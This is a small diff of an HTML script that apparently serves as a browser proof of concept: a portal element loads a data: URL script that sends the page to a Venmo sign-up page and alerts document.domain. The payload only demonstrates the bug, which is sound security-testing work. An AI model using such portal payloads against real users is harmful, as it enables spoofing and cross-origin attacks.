@@ -1,8 +1,12 @@
 <script>
-  const p = document.createElement('portal');
-  p.src = 'data:text/html,<script>window.location="https://venmo.com/signup/google";alert(document.domain);<"+"/script>';
-  document.body.appendChild(p);
-  p.activate();
+ 
+
+
+portal = document.createElement('portal');
+portal.src = 'data:text/html,<script>window.location="https://venmo.com/signup/google";alert(document.domain);<"+"/script>';
+portal.style = '...';
+document.body.appendChild(portal);
+portal.activate();
+  
+  
 </script>
-
-
